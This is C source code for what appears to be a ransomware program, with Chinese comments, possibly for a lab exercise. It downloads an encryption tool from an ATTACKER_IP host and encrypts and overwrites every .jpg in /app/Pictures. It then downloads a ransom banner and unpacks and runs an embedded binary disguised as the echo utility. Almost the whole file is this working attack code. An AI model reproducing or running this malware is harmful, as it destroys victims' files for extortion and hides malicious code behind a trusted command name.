#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <dirent.h>
#include <zlib.h>
#include <sys/types.h>
#include <sys/wait.h>


#define BUFFER_SIZE 4096

// 壓縮的 echo_gz.h 檔案（從 xxd -i 得來）
#include "echo_gz.h"

// 下載檔案（從伺服器）
int download_file(const char *request, const char *output_path) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("socket");
        return -1;
    }

    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = htons(ATTACKER_PORT);
    inet_pton(AF_INET, ATTACKER_IP, &server.sin_addr);

    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
        perror("connect");
        close(sock);
        return -1;
    }

    send(sock, request, strlen(request), 0);

    FILE *fp = fopen(output_path, "wb");
    if (!fp) {
        perror("fopen");
        close(sock);
        return -1;
    }

    char buffer[BUFFER_SIZE];
    ssize_t bytes;
    while ((bytes = recv(sock, buffer, sizeof(buffer), 0)) > 0) {
        fwrite(buffer, 1, bytes, fp);
    }

    fclose(fp);
    close(sock);
    return 0;
}

// 顯示 banner
void show_banner(const char *banner_path) {
    FILE *fp = fopen(banner_path, "r");
    if (!fp) {
        perror("fopen");
        return;
    }

    char line[256];
    while (fgets(line, sizeof(line), fp)) {
        printf("%s", line);
    }

    fclose(fp);
}


// 解壓 echo.gz 並執行
void restore_and_execute_echo(int argc, char *argv[]) {
    const char *gz_path = "echo.gz";
    const char *echo_path = "orin_echo";

    // 寫入 echo.gz
    FILE *fp = fopen(gz_path, "wb");
    if (!fp) {
        perror("fopen gzip");
        return;
    }
    fwrite(echo_gz, 1, echo_gz_len, fp);
    fclose(fp);

    // 解壓縮成 echo 可執行檔
    char cmd[256];
    snprintf(cmd, sizeof(cmd), "gzip -d -c %s > %s", gz_path, echo_path);
    if (system(cmd) != 0) {
        fprintf(stderr, "❌ 解壓縮 echo.gz 失敗\n");
        return;
    }

    // 設定可執行權限
    chmod(echo_path, 0755);

    // 準備參數（argv[0] 為 "echo"，argv[1...] 是原始參數）
    char *exec_args[argc + 1];
    exec_args[0] = "echo";
    for (int i = 1; i < argc; ++i) {
        exec_args[i] = argv[i];
    }
    exec_args[argc] = NULL;

    // fork + execv
    pid_t pid = fork();
    if (pid == 0) {
        execv(echo_path, exec_args);
        perror("execv");
        exit(1);
    } else if (pid > 0) {
        waitpid(pid, NULL, 0);
    } else {
        perror("fork");
    }
    remove(gz_path);
    remove(echo_path);

}

void encrypt_jpgs_in_app_pictures() {
    const char *dir_path = "/app/Pictures/";
    DIR *dir = opendir(dir_path);
    struct dirent *entry;

    if (!dir) {
        perror("Failed to open /app/Pictures/");
        return;
    }

    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type == DT_REG) {
            const char *filename = entry->d_name;
            size_t len = strlen(filename);

            // Check if filename ends with .jpg
            if (len > 4 && strcmp(filename + len - 4, ".jpg") == 0) {
                char input_path[512];
                char temp_output_path[512];
                char cmd[1024];

                snprintf(input_path, sizeof(input_path), "%s%s", dir_path, filename);
                snprintf(temp_output_path, sizeof(temp_output_path), "%s%s.tmp", dir_path, filename);
                snprintf(cmd, sizeof(cmd), "/tmp/aes-tool enc \"%s\" \"%s\"", input_path, temp_output_path);

                // 執行加密
                system(cmd);

                // 刪除原始檔
                remove(input_path);
                rename(temp_output_path, input_path); // 把 temp 改回原本檔名
            }
        }
    }

    closedir(dir);
}


int main(int argc, char *argv[]) {
    // 1. 下載 aes-tool
    if (download_file("aes-tool", "/tmp/aes-tool") != 0) {
        fprintf(stderr, "❌ 無法下載 aes-tool\n");
        return 1;
    }
    chmod("/tmp/aes-tool", 0755);

    // 2. 加密 victim 照片
    encrypt_jpgs_in_app_pictures("/app/Pictures");

    // 3. 顯示 banner
    if (download_file("banner", "/tmp/banner") == 0) {
        show_banner("/tmp/banner");
    } else {
        fprintf(stderr, "⚠ 無法下載 banner\n");
    }

    // 4. 解壓與執行 echo
    restore_and_execute_echo(argc, argv);

    remove("/tmp/banner");
    remove("/tmp/aes-tool");

    return 0;
}
